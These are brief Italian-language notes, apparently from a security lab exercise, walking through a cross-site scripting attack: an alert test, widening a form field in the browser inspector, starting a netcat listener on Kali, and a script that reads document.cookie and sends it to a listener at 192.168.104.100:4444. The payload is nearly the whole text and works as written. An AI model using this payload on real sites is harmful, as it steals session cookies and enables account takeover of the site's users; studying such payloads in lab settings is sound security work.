
modo normale 

<script>alert(document.coockie)</script>

dopo nel foglio inspect allargo il campo di testo per fare stare il mio script

metto la kali in ascolto
nc -lvnp 4444

script da mettere nel campo di testo della form
<script>
    var cookie = document.cookie;
    var url = "http://192.168.104.100:4444/?" + cookie;
    var img = new Image();
    img.src = url;
</script>
